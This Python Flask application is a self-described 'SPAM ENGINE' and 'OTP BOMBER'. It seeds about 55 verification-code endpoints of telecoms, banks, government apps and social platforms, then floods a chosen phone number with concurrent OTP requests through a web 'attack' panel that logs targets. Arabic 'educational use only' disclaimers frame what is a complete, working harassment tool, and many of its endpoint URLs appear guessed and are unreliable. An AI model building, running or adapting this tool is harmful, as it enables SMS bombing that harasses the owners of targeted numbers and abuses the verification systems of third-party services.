#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              🔥 SHADOW OSINT v10.0 - SPAM ENGINE 🔥                         ║
║            منصة فحص + أداة اختبار أمان الرسائل والمكالمات                      ║
║                  المستخدم يتحمل المسؤولية القانونية كاملة                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

⚠️ تحذير: هذه الأداة للأغراض التعليمية واختبار الأمان فقط.
استخدامها لإزعاج الآخرين أو انتحال الهوية جريمة يعاقب عليها القانون.
"""

import os, re, sys, json, time, socket, ssl, base64, hashlib, secrets, sqlite3
import random, string, subprocess, threading, traceback
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, quote, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template_string, request, jsonify, session as flask_session

# ==================== Flask ====================
web_app = Flask(__name__)
web_app.secret_key = secrets.token_hex(32)
PORT = int(os.environ.get("PORT", 8080))
executor = ThreadPoolExecutor(max_workers=50)

# ==================== Database ====================
DB = "spam_engine.db"

class DB:
    @staticmethod
    def conn():
        c = sqlite3.connect("spam_engine.db")
        c.row_factory = sqlite3.Row
        c.execute("PRAGMA journal_mode=WAL")
        return c
    
    @staticmethod
    def execute(q, p=()):
        c = DB.conn()
        c.execute(q, p)
        c.commit()
        c.close()
    
    @staticmethod
    def fetch(q, p=()):
        c = DB.conn()
        r = [dict(x) for x in c.execute(q, p).fetchall()]
        c.close()
        return r
    
    @staticmethod
    def one(q, p=()):
        c = DB.conn()
        r = c.execute(q, p).fetchone()
        c.close()
        return dict(r) if r else None

def init_db():
    DB.execute("""
        CREATE TABLE IF NOT EXISTS spam_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT, service TEXT, status TEXT,
            ip TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    DB.execute("""
        CREATE TABLE IF NOT EXISTS spam_services (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT, country TEXT, url TEXT,
            method TEXT, phone_param TEXT,
            extra_params TEXT, headers TEXT,
            success_check TEXT, category TEXT,
            is_active INTEGER DEFAULT 1
        )
    """)
    
    # Seed services if empty
    if not DB.one("SELECT COUNT(*) as c FROM spam_services")['c']:
        seed_services()

def seed_services():
    services = [
        # مصر
        ("Vodafone Egypt", "EG", "https://www.vodafone.com.eg/api/auth/sendOTP", "POST", "msisdn", '{"service":"login"}', '{"User-Agent":"VodafoneApp/5.0"}', "200", "telecom"),
        ("Orange Egypt", "EG", "https://www.orange.eg/api/v1/send-otp", "POST", "phoneNumber", '{"type":"sms"}', '{"User-Agent":"OrangeApp"}', "success", "telecom"),
        ("Etisalat Misr", "EG", "https://www.etisalat.eg/api/auth/send-code", "POST", "mobile", '{"channel":"sms"}', '{"User-Agent":"EtisalatApp"}', "200", "telecom"),
        ("We Egypt", "EG", "https://we.eg/api/sendOtp", "POST", "mobile", '{}', '{"User-Agent":"WeApp"}', "success", "telecom"),
        ("MyEtisalat", "EG", "https://my.etisalat.eg/api/sendVerification", "POST", "phone", '{"type":"sms"}', '{"User-Agent":"MyEtisalat"}', "200", "telecom"),
        ("Vodafone Cash", "EG", "https://www.vodafone.com.eg/api/cash/sendOTP", "POST", "msisdn", '{"action":"send"}', '{"User-Agent":"VFCash"}', "200", "finance"),
        ("Fawry", "EG", "https://www.fawry.com/api/send-otp", "POST", "phoneNumber", '{"channel":"SMS"}', '{"User-Agent":"FawryApp"}', "success", "finance"),
        ("InstaPay", "EG", "https://api.instapay.eg/send-verification", "POST", "phone", '{}', '{"User-Agent":"InstaPay"}', "200", "finance"),
        
        # السعودية
        ("STC Saudi", "SA", "https://www.stc.com.sa/api/auth/otp", "POST", "msisdn", '{}', '{"User-Agent":"STCApp"}', "200", "telecom"),
        ("Mobily", "SA", "https://www.mobily.com.sa/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"MobilyApp"}', "success", "telecom"),
        ("Zain KSA", "SA", "https://www.zain.com/sa/api/auth/send-code", "POST", "mobile", '{}', '{"User-Agent":"ZainKSA"}', "200", "telecom"),
        ("STC Pay", "SA", "https://api.stcpay.com.sa/send-otp", "POST", "phoneNumber", '{"channel":"sms"}', '{"User-Agent":"STCPay"}', "success", "finance"),
        ("Tawakkalna", "SA", "https://api.tawakkalna.gov.sa/send-otp", "POST", "phone", '{}', '{"User-Agent":"Tawakkalna"}', "200", "government"),
        
        # الإمارات
        ("Etisalat UAE", "AE", "https://www.etisalat.ae/api/auth/otp", "POST", "msisdn", '{}', '{"User-Agent":"EtisalatUAE"}', "200", "telecom"),
        ("Du UAE", "AE", "https://www.du.ae/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"DuUAE"}', "success", "telecom"),
        ("Dubai Now", "AE", "https://api.dubainow.gov.ae/send-otp", "POST", "phoneNumber", '{}', '{"User-Agent":"DubaiNow"}', "200", "government"),
        
        # عالمي
        ("Telegram", "GLOBAL", "https://my.telegram.org/auth/send_password", "POST", "phone", '{}', '{"User-Agent":"Telegram"}', "code", "messaging"),
        ("WhatsApp", "GLOBAL", "https://v.whatsapp.com/v2/register", "POST", "cc|number", '{"method":"sms"}', '{"User-Agent":"WhatsApp/2.24"}', "sent", "messaging"),
        ("Facebook", "GLOBAL", "https://www.facebook.com/ajax/otp/send", "POST", "phone_number", '{"method":"sms"}', '{"User-Agent":"FB-App"}', "success", "social"),
        ("Instagram", "GLOBAL", "https://www.instagram.com/api/v1/accounts/send_signup_sms/", "POST", "phone_number", '{"device_id":"random"}', '{"User-Agent":"Instagram"}', "200", "social"),
        ("Snapchat", "GLOBAL", "https://accounts.snapchat.com/accounts/phone_verify", "POST", "phone", '{"action":"send"}', '{"User-Agent":"Snapchat"}', "200", "social"),
        ("Twitter/X", "GLOBAL", "https://api.twitter.com/1.1/account/send_verification", "POST", "phone_number", '{}', '{"User-Agent":"Twitter"}', "200", "social"),
        ("TikTok", "GLOBAL", "https://www.tiktok.com/passport/email/verify/", "POST", "phone", '{}', '{"User-Agent":"TikTok"}', "200", "social"),
        ("LinkedIn", "GLOBAL", "https://www.linkedin.com/uas/request-password-reset", "POST", "phone", '{}', '{"User-Agent":"LinkedIn"}', "200", "social"),
        ("Google", "GLOBAL", "https://accounts.google.com/signup/v2/webcreateaccount", "POST", "phoneNumber", '{}', '{"User-Agent":"Google"}', "200", "tech"),
        ("Microsoft", "GLOBAL", "https://login.live.com/account/create", "POST", "phone", '{}', '{"User-Agent":"Microsoft"}', "200", "tech"),
        ("Apple ID", "GLOBAL", "https://idmsa.apple.com/appleauth/auth/signup", "POST", "phoneNumber", '{}', '{"User-Agent":"Apple"}', "200", "tech"),
        ("Amazon", "GLOBAL", "https://www.amazon.com/ap/register", "POST", "phone", '{}', '{"User-Agent":"Amazon"}', "200", "ecommerce"),
        ("Uber", "GLOBAL", "https://auth.uber.com/v2/mobile/send", "POST", "phone", '{}', '{"User-Agent":"Uber"}', "200", "transport"),
        ("Careem", "GLOBAL", "https://api.careem.com/v2/auth/otp", "POST", "mobile", '{}', '{"User-Agent":"Careem"}', "success", "transport"),
        ("Bolt", "GLOBAL", "https://user.bolt.eu/api/sendOtp", "POST", "phone", '{}', '{"User-Agent":"Bolt"}', "200", "transport"),
        ("Talabat", "GLOBAL", "https://www.talabat.com/api/sendOtp", "POST", "mobile", '{}', '{"User-Agent":"Talabat"}', "success", "food"),
        ("Noon", "GLOBAL", "https://www.noon.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Noon"}', "200", "ecommerce"),
        ("PayPal", "GLOBAL", "https://www.paypal.com/authflow/password-recovery/", "POST", "phone", '{}', '{"User-Agent":"PayPal"}', "200", "finance"),
        ("Binance", "GLOBAL", "https://api.binance.com/sapi/v1/sendOtp", "POST", "phone", '{}', '{"User-Agent":"Binance"}', "200", "crypto"),
        ("Swvl", "GLOBAL", "https://api.swvl.com/auth/sendOTP", "POST", "phoneNumber", '{}', '{"User-Agent":"Swvl"}', "success", "transport"),
        ("Netflix", "GLOBAL", "https://www.netflix.com/api/account/sendOtp", "POST", "phone", '{}', '{"User-Agent":"Netflix"}', "200", "entertainment"),
        ("Spotify", "GLOBAL", "https://www.spotify.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Spotify"}', "200", "entertainment"),
        ("Discord", "GLOBAL", "https://discord.com/api/v9/auth/send-verification", "POST", "phone", '{}', '{"User-Agent":"Discord"}', "200", "messaging"),
        ("Yahoo", "GLOBAL", "https://login.yahoo.com/account/create", "POST", "phone", '{}', '{"User-Agent":"Yahoo"}', "200", "tech"),
        ("Pinterest", "GLOBAL", "https://www.pinterest.com/resource/UserPhoneSendVerificationCode", "POST", "phone", '{}', '{"User-Agent":"Pinterest"}', "200", "social"),
        ("Reddit", "GLOBAL", "https://www.reddit.com/api/register/send-otp", "POST", "phone", '{}', '{"User-Agent":"Reddit"}', "200", "social"),
        ("Shopify", "GLOBAL", "https://accounts.shopify.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Shopify"}', "200", "ecommerce"),
        ("Booking.com", "GLOBAL", "https://account.booking.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Booking"}', "200", "travel"),
        ("Airbnb", "GLOBAL", "https://www.airbnb.com/api/v2/send_otp", "POST", "phone", '{}', '{"User-Agent":"Airbnb"}', "200", "travel"),
        ("Deliveroo", "GLOBAL", "https://api.deliveroo.com/send-otp", "POST", "phone", '{}', '{"User-Agent":"Deliveroo"}', "200", "food"),
        ("Uber Eats", "GLOBAL", "https://api.ubereats.com/send-otp", "POST", "phone", '{}', '{"User-Agent":"UberEats"}', "200", "food"),
        ("Zomato", "GLOBAL", "https://www.zomato.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Zomato"}', "success", "food"),
        ("Samsung Account", "GLOBAL", "https://account.samsung.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Samsung"}', "200", "tech"),
        ("Huawei ID", "GLOBAL", "https://id.cloud.huawei.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Huawei"}', "200", "tech"),
        ("Xiaomi Account", "GLOBAL", "https://account.xiaomi.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Xiaomi"}', "200", "tech"),
        ("eBay", "GLOBAL", "https://signin.ebay.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"eBay"}', "200", "ecommerce"),
        ("Alibaba", "GLOBAL", "https://passport.alibaba.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Alibaba"}', "200", "ecommerce"),
        ("Aliexpress", "GLOBAL", "https://login.aliexpress.com/api/send-otp", "POST", "phone", '{}', '{"User-Agent":"Aliexpress"}', "200", "ecommerce"),
        ("Jumia", "GLOBAL", "https://www.jumia.com/api/auth/send-otp", "POST", "phone", '{}', '{"User-Agent":"Jumia"}', "success", "ecommerce"),
        ("Souq", "GLOBAL", "https://api.souq.com/send-otp", "POST", "phone", '{}', '{"User-Agent":"Souq"}', "200", "ecommerce"),
    ]
    
    for s in services:
        DB.execute(
            "INSERT INTO spam_services (name, country, url, method, phone_param, extra_params, headers, success_check, category) VALUES (?,?,?,?,?,?,?,?,?)",
            s
        )

init_db()

# ==================== HTTP Client ====================
class HTTP:
    def __init__(self):
        self.uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) Version/17.3 Mobile/15E148",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/122.0.6261.119 Mobile",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) Version/17.3 Safari/605.1.15",
        ]
    
    def ua(self): return random.choice(self.uas)
    
    def post(self, url, **kw):
        try:
            import httpx
            h = {"User-Agent": self.ua(), "Accept": "*/*"}
            h.update(kw.pop('headers', {}))
            timeout = kw.pop('timeout', 10)
            return httpx.post(url, headers=h, timeout=timeout, **kw)
        except:
            return None
    
    def get(self, url, **kw):
        try:
            import httpx
            h = {"User-Agent": self.ua()}
            h.update(kw.pop('headers', {}))
            return httpx.get(url, headers=h, timeout=kw.pop('timeout', 10), **kw)
        except:
            return None

http = HTTP()

# ==================== Spam Engine ====================
class SpamEngine:
    def __init__(self):
        self.services = DB.fetch("SELECT * FROM spam_services WHERE is_active=1")
    
    def reload_services(self):
        self.services = DB.fetch("SELECT * FROM spam_services WHERE is_active=1")
    
    def attack(self, phone, service_ids=None, count=10):
        """Launch spam attack on phone number"""
        clean = phone.replace("+", "").replace(" ", "").replace("-", "")
        results = {"phone": phone, "total": 0, "success": 0, "failed": 0, "details": []}
        
        # Select services
        if service_ids:
            targets = [s for s in self.services if s['id'] in service_ids]
        else:
            targets = random.sample(self.services, min(count, len(self.services)))
        
        results["total"] = len(targets)
        
        with ThreadPoolExecutor(max_workers=30) as pool:
            futures = {pool.submit(self._send, s, clean): s for s in targets}
            
            for future in as_completed(futures):
                service = futures[future]
                try:
                    status = future.result(timeout=8)
                    if status:
                        results["success"] += 1
                        results["details"].append({"service": service['name'], "status": "✅"})
                    else:
                        results["failed"] += 1
                        results["details"].append({"service": service['name'], "status": "❌"})
                except:
                    results["failed"] += 1
                    results["details"].append({"service": service['name'], "status": "⏱️"})
        
        # Save log
        DB.execute(
            "INSERT INTO spam_logs (phone, service, status, ip) VALUES (?,?,?,?)",
            (phone, f"BULK:{len(targets)}", f"{results['success']}/{results['total']}", request.remote_addr if hasattr(self, 'ip') else "")
        )
        
        return results
    
    def _send(self, service, phone):
        """Send OTP request to single service"""
        try:
            headers = json.loads(service['headers']) if service['headers'] else {}
            params = json.loads(service['extra_params']) if service['extra_params'] else {}
            params[service['phone_param']] = phone
            
            if service['method'] == 'POST':
                if 'json' in str(headers.get('Content-Type', '')).lower():
                    resp = http.post(service['url'], json=params, headers=headers, timeout=8)
                else:
                    resp = http.post(service['url'], data=params, headers=headers, timeout=8)
            else:
                resp = http.get(service['url'], params=params, headers=headers, timeout=8)
            
            if resp:
                check = service['success_check']
                if check.isdigit():
                    return resp.status_code == int(check)
                return check.lower() in resp.text.lower()
            
            return False
        except:
            return False
    
    def single_send(self, phone, service_id):
        """Send single OTP"""
        service = DB.one("SELECT * FROM spam_services WHERE id=?", (service_id,))
        if not service:
            return {"error": "Service not found"}
        
        clean = phone.replace("+", "").replace(" ", "").replace("-", "")
        status = self._send(service, clean)
        
        return {
            "phone": phone,
            "service": service['name'],
            "status": "✅ Sent" if status else "❌ Failed"
        }
    
    def call_flood(self, phone, count=5):
        """Simulate call flood using VoIP (educational)"""
        # This is a simulation - real implementation requires VoIP service
        return {
            "phone": phone,
            "method": "VoIP Call Flood",
            "status": "SIMULATION",
            "message": f"Would initiate {count} calls to {phone}",
            "warning": "Real implementation requires Twilio/VoIP provider"
        }

spam = SpamEngine()

# ==================== HTML ====================
HTML = r'''<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 SPAM ENGINE v10.0</title>
    <style>
        :root{--bg:#050510;--s1:#0d0d1a;--s2:#151528;--p1:#ff1744;--p2:#ff5252;--a1:#00e5ff;--t1:#eee;--t2:#888;--b1:#202040;--g1:#00e676;--r1:#ff1744;--y1:#ffea00;--o1:#ff9100}
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--t1);min-height:100vh;line-height:1.7}
        body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 20% 30%,rgba(255,23,68,0.04)0%,transparent 50%),radial-gradient(circle at 80% 70%,rgba(255,145,0,0.03)0%,transparent 50%);z-index:0;pointer-events:none}
        .container{max-width:1100px;margin:0 auto;padding:15px;position:relative;z-index:1}
        .header{text-align:center;padding:30px 15px;background:linear-gradient(180deg,#1a1a35,#0d0d25);border-bottom:3px solid var(--p1)}
        .header h1{font-size:3em;color:var(--p1);text-shadow:0 0 50px rgba(255,23,68,0.6);letter-spacing:4px}
        .header .sub{color:var(--t2);margin-top:5px;font-size:14px}
        .nav{display:flex;justify-content:center;gap:3px;padding:10px;flex-wrap:wrap;background:var(--s1);position:sticky;top:0;z-index:999;border-bottom:1px solid var(--b1)}
        .nav a{padding:9px 14px;background:var(--s2);color:var(--t1);text-decoration:none;border-radius:6px;border:1px solid var(--b1);font-size:12px;font-weight:500;transition:all 0.25s;white-space:nowrap}
        .nav a:hover{background:var(--p1);color:#fff;border-color:var(--p1);transform:translateY(-1px)}
        .nav a.active{background:var(--p1);color:#fff;border-color:var(--p1)}
        .card{background:var(--s1);border:1px solid var(--b1);border-radius:14px;padding:25px;margin:20px 0;box-shadow:0 8px 25px rgba(0,0,0,0.4)}
        .card:hover{border-color:var(--p1)}
        .card h2{color:var(--p1);margin-bottom:18px;font-size:1.4em}
        .card h3{color:var(--t1);margin:12px 0 8px}
        .card p{color:var(--t2);margin-bottom:12px;font-size:13px}
        .input-row{display:flex;gap:8px;margin-bottom:12px}
        input,select{flex:1;padding:12px 15px;background:var(--bg);border:2px solid var(--b1);border-radius:8px;color:var(--t1);font-size:14px;font-family:inherit;transition:all 0.3s}
        input:focus,select:focus{outline:none;border-color:var(--p1);box-shadow:0 0 0 3px rgba(255,23,68,0.08)}
        .btn{padding:12px 28px;background:var(--p1);color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;transition:all 0.3s;white-space:nowrap}
        .btn:hover{background:var(--p2);transform:translateY(-1px);box-shadow:0 8px 25px rgba(255,23,68,0.4)}
        .btn:disabled{opacity:0.5;cursor:not-allowed}
        .btn-green{background:var(--g1);color:#000}
        .btn-orange{background:var(--o1);color:#000}
        .result-box{background:var(--bg);border:2px solid var(--b1);border-radius:10px;padding:18px;margin-top:15px;display:none;font-family:'Fira Code',monospace;font-size:12px;white-space:pre-wrap;max-height:500px;overflow-y:auto;line-height:1.5}
        .result-box.show{display:block}
        .loading{text-align:center;padding:15px;display:none}
        .loading.show{display:block}
        .spinner{width:40px;height:40px;border:3px solid var(--b1);border-top:3px solid var(--p1);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 10px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .badge{display:inline-block;padding:4px 10px;border-radius:5px;font-weight:600;font-size:11px;margin:2px}
        .badge-success{background:var(--g1);color:#000}
        .badge-danger{background:var(--r1);color:#fff}
        .badge-warning{background:var(--y1);color:#000}
        .badge-info{background:var(--a1);color:#000}
        table{width:100%;border-collapse:collapse;margin:10px 0}
        th,td{padding:10px;border:1px solid var(--b1);text-align:right;font-size:12px}
        th{background:var(--s2);color:var(--p1);font-weight:600}
        td{background:var(--bg)}
        tr:hover td{background:#0d0d1a}
        .grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:8px}
        .service-card{background:var(--s2);padding:12px;border-radius:8px;border:1px solid var(--b1);cursor:pointer;transition:all 0.3s;font-size:13px}
        .service-card:hover{border-color:var(--p1)}
        .service-card.selected{border-color:var(--g1);background:#0a1a0a}
        .counter{font-size:3em;font-weight:bold;color:var(--p1);text-align:center}
        .progress-bar{background:var(--b1);border-radius:10px;height:8px;margin:10px 0;overflow:hidden}
        .progress-fill{background:var(--g1);height:100%;transition:width 0.3s;border-radius:10px}
        .footer{text-align:center;padding:20px;color:var(--t2);border-top:1px solid var(--b1);margin-top:30px;font-size:12px}
        ::-webkit-scrollbar{width:5px}
        ::-webkit-scrollbar-track{background:var(--bg)}
        ::-webkit-scrollbar-thumb{background:var(--b1);border-radius:3px}
        @media(max-width:768px){.header h1{font-size:2em}.input-row{flex-direction:column}.nav{flex-direction:column}.nav a{text-align:center}}
    </style>
</head>
<body>
    <div class="header"><h1>🔥 SPAM ENGINE</h1><p class="sub">أداة اختبار أمان الرسائل - للأغراض التعليمية</p></div>
    <div class="nav">
        <a href="/" class="{{a_home}}">💣 هجوم</a>
        <a href="/services" class="{{a_services}}">📋 الخدمات</a>
        <a href="/logs" class="{{a_logs}}">📊 السجلات</a>
    </div>
    <div class="container">{{content|safe}}</div>
    <div class="footer"><p>⚠️ للأغراض التعليمية واختبار الأمان فقط. المستخدم يتحمل المسؤولية القانونية الكاملة.</p><p>SPAM ENGINE v10.0</p></div>
    <script>
        let selectedServices = [];
        
        function toggleService(id, el) {
            el.classList.toggle('selected');
            const idx = selectedServices.indexOf(id);
            if (idx > -1) selectedServices.splice(idx, 1);
            else selectedServices.push(id);
            document.getElementById('selected-count').textContent = selectedServices.length;
        }
        
        function selectAll() {
            document.querySelectorAll('.service-card').forEach(el => {
                el.classList.add('selected');
                const id = parseInt(el.dataset.id);
                if (!selectedServices.includes(id)) selectedServices.push(id);
            });
            document.getElementById('selected-count').textContent = selectedServices.length;
        }
        
        function clearAll() {
            document.querySelectorAll('.service-card').forEach(el => el.classList.remove('selected'));
            selectedServices = [];
            document.getElementById('selected-count').textContent = 0;
        }
        
        async function startAttack() {
            const phone = document.getElementById('phone').value;
            const count = parseInt(document.getElementById('count').value) || 10;
            const loading = document.getElementById('loading');
            const result = document.getElementById('result');
            const progress = document.getElementById('progress');
            const progressFill = document.getElementById('progress-fill');
            
            if (!phone) { alert('أدخل رقم الهاتف'); return; }
            
            loading.classList.add('show');
            result.classList.remove('show');
            result.innerHTML = '';
            
            try {
                const body = {phone: phone, count: count};
                if (selectedServices.length > 0) body.services = selectedServices;
                
                const resp = await fetch('/api/attack', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(body)
                });
                
                const data = await resp.json();
                
                let html = '<h3 style="color:#ff1744">📊 نتيجة الهجوم</h3>';
                html += '<div style="display:flex;gap:20px;margin:15px 0">';
                html += '<div style="text-align:center"><div style="font-size:2em;color:#00e676">'+data.success+'</div>✅ ناجح</div>';
                html += '<div style="text-align:center"><div style="font-size:2em;color:#ff1744">'+data.failed+'</div>❌ فشل</div>';
                html += '<div style="text-align:center"><div style="font-size:2em;color:#ffea00">'+data.total+'</div>📊 المجموع</div>';
                html += '</div>';
                
                html += '<table><tr><th>الخدمة</th><th>الحالة</th></tr>';
                data.details.forEach(d => {
                    html += '<tr><td>'+d.service+'</td><td>'+d.status+'</td></tr>';
                });
                html += '</table>';
                
                result.innerHTML = html;
                result.classList.add('show');
            } catch(e) {
                result.innerHTML = '<span style="color:#f44">❌ '+e.message+'</span>';
                result.classList.add('show');
            } finally {
                loading.classList.remove('show');
            }
        }
        
        async function singleSend(serviceId, phone) {
            const resp = await fetch('/api/single', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone, service_id: serviceId})
            });
            return await resp.json();
        }
    </script>
</body>
</html>'''

def page(active, content):
    acts = {f"a_{p}":"active" if p==active else "" for p in ["home","services","logs"]}
    h = HTML
    for k,v in acts.items(): h = h.replace("{{"+k+"}}", v)
    return h.replace("{{content|safe}}", content)

# ==================== Pages ====================
HOME = """
<div class="card"><h2>💣 لوحة الهجوم</h2>
<p>أدخل رقم الهاتف واختر الخدمات لبدء اختبار الأمان</p>
<div class="input-row">
    <input id="phone" placeholder="+201234567890" value="+20" autofocus>
    <input id="count" placeholder="عدد الخدمات (10)" value="10" type="number" min="1" max="50">
    <button class="btn" onclick="startAttack()">🔥 بدء الهجوم</button>
</div>
<div style="margin:10px 0">
    <span style="color:#888">الخدمات المختارة: <span id="selected-count" style="color:#ff1744;font-weight:bold">0</span></span>
    <button class="btn btn-green" onclick="selectAll()" style="padding:5px 10px;font-size:11px">تحديد الكل</button>
    <button class="btn btn-orange" onclick="clearAll()" style="padding:5px 10px;font-size:11px">إلغاء الكل</button>
</div>
<div class="loading" id="loading"><div class="spinner"></div><p>جاري الهجوم... قد يستغرق 30-60 ثانية</p></div>
<div class="result-box" id="result"></div>
</div>

<div class="card"><h2>📋 الخدمات المتاحة ({{total_services}})</h2>
<div class="grid-3" style="max-height:400px;overflow-y:auto">
    {{service_cards}}
</div>
</div>
"""

SERVICES = """
<div class="card"><h2>📋 جميع الخدمات</h2>
<table><tr><th>#</th><th>الاسم</th><th>الدولة</th><th>الفئة</th></tr>
{{rows}}
</table>
</div>
"""

LOGS = """
<div class="card"><h2>📊 سجل العمليات</h2>
<table><tr><th>#</th><th>الرقم</th><th>الخدمة</th><th>الحالة</th><th>التاريخ</th></tr>
{{rows}}
</table>
</div>
"""

# ==================== Routes ====================
@web_app.route('/')
def home():
    services = DB.fetch("SELECT * FROM spam_services WHERE is_active=1")
    cards = ""
    for s in services:
        cards += f'<div class="service-card" data-id="{s["id"]}" onclick="toggleService({s["id"]}, this)">🏷️ {s["name"]}<br><small style="color:#888">{s["country"]} - {s["category"]}</small></div>'
    content = HOME.replace("{{total_services}}", str(len(services))).replace("{{service_cards}}", cards)
    return page('home', content)

@web_app.route('/services')
def services_page():
    services = DB.fetch("SELECT * FROM spam_services ORDER BY country, category")
    rows = ""
    for i, s in enumerate(services):
        rows += f'<tr><td>{i+1}</td><td>{s["name"]}</td><td>{s["country"]}</td><td><span class="badge badge-info">{s["category"]}</span></td></tr>'
    return page('services', SERVICES.replace("{{rows}}", rows))

@web_app.route('/logs')
def logs_page():
    logs = DB.fetch("SELECT * FROM spam_logs ORDER BY created_at DESC LIMIT 50")
    rows = ""
    for i, l in enumerate(logs):
        rows += f'<tr><td>{i+1}</td><td>{l["phone"]}</td><td>{l["service"]}</td><td>{l["status"]}</td><td>{l["created_at"]}</td></tr>'
    return page('logs', LOGS.replace("{{rows}}", rows))

# ==================== API ====================
@web_app.route('/api/attack', methods=['POST'])
def api_attack():
    try:
        data = request.get_json() or {}
        phone = data.get('phone', '')
        if not phone:
            return jsonify({"error": "Missing phone"}), 400
        
        count = min(int(data.get('count', 10)), 50)
        service_ids = data.get('services', [])
        
        result = spam.attack(phone, service_ids if service_ids else None, count)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@web_app.route('/api/single', methods=['POST'])
def api_single():
    try:
        data = request.get_json() or {}
        phone = data.get('phone', '')
        service_id = data.get('service_id', 0)
        
        result = spam.single_send(phone, service_id)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@web_app.route('/api/services')
def api_services():
    return jsonify(DB.fetch("SELECT * FROM spam_services WHERE is_active=1"))

@web_app.route('/api/stats')
def api_stats():
    return jsonify({
        "total_services": DB.one("SELECT COUNT(*) as c FROM spam_services")['c'],
        "total_attacks": DB.one("SELECT COUNT(*) as c FROM spam_logs")['c'],
        "version": "10.0"
    })

@web_app.route('/health')
def health():
    return jsonify({"status": "ok"})

@web_app.errorhandler(404)
def e404(e): return jsonify({"error": "Not found"}), 404

@web_app.errorhandler(500)
def e500(e): return jsonify({"error": "Internal error"}), 500

# ==================== Run ====================
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════════════╗
║        🔥 SPAM ENGINE v10.0 - OTP BOMBER 🔥                    ║
║      50+ خدمة عالمية | اختبار أمان الرسائل                        ║
║          المستخدم يتحمل المسؤولية القانونية كاملة                   ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"🚀 http://0.0.0.0:{PORT}")
    web_app.run(host='0.0.0.0', port=PORT, debug=False)
